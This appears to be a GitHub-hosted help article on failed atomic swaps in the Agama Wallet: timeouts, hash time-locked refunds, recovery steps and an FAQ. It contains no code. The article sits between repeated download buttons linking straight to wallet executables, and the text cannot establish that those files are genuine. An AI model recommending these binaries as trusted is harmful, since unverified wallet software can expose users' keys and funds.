[![Agama Wallet](assets/banner-article.png)](https://github.com/agama-wallet/agama-desktop-wallet)

# When an Atomic Swap Fails: Timeouts and Refunds

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7"><img src="https://img.shields.io/badge/RELEASE-v0.3.7-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="Agama Wallet v0.3.7"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/blob/main/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="MIT licence"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page.

---

A failed atomic swap does not lose funds: each leg is locked with a deadline, and once that deadline passes the original owner can reclaim it with a refund transaction. What a failure costs is time and fees, not the locked amount. Agama Wallet is a self-custody multi-asset wallet for the Komodo ecosystem with built-in atomic swaps, and its maker describes trades that settle through hash time-locked contracts with a stated typical duration of 5 to 30 minutes.

## You'll see this if

A swap has been sitting at the same step for longer than expected, or the countdown has reached zero and the interface is offering a new button.

| What happened | What is locked | What happens next |
|---|---|---|
| You locked, counterparty never did | Your leg only | Refund at your deadline |
| Both locked, counterparty never claimed | Both legs | You claim; they refund, or vice versa |
| Countdown passed with no claim | Both legs | Each side takes its refund path |
| Claim broadcast but unconfirmed | Nothing new | Wait; the deadline still applies to the output |
| Swap completed but balance unchanged | Nothing | Check confirmations |

## Why it happens

Atomicity guarantees that one side cannot take both legs. It does not guarantee that both sides act. A trade can stall because a counterparty went offline, because a fee was set too low for the chain's current conditions, or because the wallet lost track of the second leg's state.

The deadlines are what make stalling survivable. Each lock has a time after which the funds can be reclaimed by their original owner, and the two deadlines are deliberately offset so that the second party has time to claim after the secret becomes public. When a trade stalls, nothing is lost; the refund path simply becomes available.

Refunds are transactions, not reversals. That distinction matters: a refund needs a fee, must be broadcast, and confirms like anything else. A wallet that is offline when the deadline passes still has the right to refund, because the right is encoded in the output rather than in the software.

## Fix

Work from the chain, not from the interface.

1. **Identify what is actually locked.** Two outputs, two deadlines, two chains. The interface may show one.
2. **Check both deadlines against their chains' heights.** Wall-clock countdowns drift when block production is uneven.
3. **Claim if the secret is public and your deadline has not passed.** Claiming is the better outcome; a refund returns you to where you started.
4. **Refund after the deadline if nothing was claimed.** Build the refund, pay a realistic fee, and confirm.
5. **Wait for confirmation before concluding.** A refund that is broadcast but unconfirmed is not yet a recovered balance.

If the wallet will not build the refund, the output can still be spent by any software holding the key and understanding the contract, because the condition is on-chain rather than in the wallet. [What an atomic swap is](https://github.com/agama-wallet/atomic-swaps/blob/main/exchange-without-an-intermediary.md) describes the two paths that condition contains.

## If that did not work

If a refund is rejected, the deadline has not passed on that chain yet, or the wallet is not synced to the tip. Neither is a reason to send funds anywhere manually.

If the deadline passed and the output is gone, someone claimed it. Check the claiming transaction: if it revealed the secret, the trade actually completed on that side, and your claim may still be available.

If a swap repeatedly stalls with one counterparty, stop trading with them. Repeated stalls are a pattern rather than bad luck.

There is no recovery service for a stuck swap at all, and no support channel can move a locked output, whatever it promises to do. Anyone offering to do so is describing a custodial intervention that the mechanism does not contain.

## Prevention

- **Keep the wallet online and synced while a trade is live.** Deadlines run regardless, but claiming requires acting.
- **Hold fees on both chains.** A refund and a claim are both transactions.
- **Avoid amounts that are small relative to the fees.** A refund can cost a meaningful share of a small trade.
- **Record both deadlines when the trade starts.** [How atomic swaps work](https://github.com/agama-wallet/atomic-swaps/blob/main/step-by-step-mechanics.md) explains why they differ.
- **Prefer liquid pairs.** Most stalls are liquidity, and liquidity is visible before committing.

## FAQ

### Can a failed swap lose my coins?

No, provided the deadline passes and you refund. The lock returns the funds to their original owner; the cost is the fee and the wait.

### What if my computer is off when the deadline passes?

The refund right is encoded in the output, so it remains available when you return. There is no window that closes permanently, though the output sits unspent until you act.

### Do I get the network fees back?

No. Fees are paid to the chain, not held in escrow, so a failed swap costs the fees already spent plus the refund's fee.

### How long do I have to claim before a refund becomes the only option?

Until your deadline, which is measured in blocks on your chain rather than in minutes. After it, the claim path closes and the refund path opens; the funds are not lost, but the outcome changes from completing the trade to undoing it.

### Can the counterparty refund my leg?

No. The refund path is a spending condition available to the original owner, not to the other party. That is why a stalled trade cannot be resolved by the counterparty acting unilaterally.

### Is a refund automatic?

No. It is a transaction that must be built, signed and broadcast, which is why a wallet that cannot see the chain cannot refund.

---

## Download Agama Wallet v0.3.7

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Download Agama Wallet for Windows"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=apple&amp;logoColor=white" alt="Download Agama Wallet for Macos"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=linux&amp;logoColor=white" alt="Download Agama Wallet for Linux"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page, and compare each file with the value printed there.

## Related guides

- [How Atomic Swaps Work, Step by Step](https://github.com/agama-wallet/atomic-swaps/blob/main/step-by-step-mechanics.md)
- [HTLC Explained: Hash Time-Locked Contracts](https://github.com/agama-wallet/atomic-swaps/blob/main/hash-time-locked-contracts.md)
- [What an Atomic Swap Costs: Fees, Mining Costs and Spread](https://github.com/agama-wallet/atomic-swaps/blob/main/what-a-trade-costs.md)
- [Are Atomic Swaps Safe? The Risks That Remain](https://github.com/agama-wallet/atomic-swaps/blob/main/are-they-safe.md)
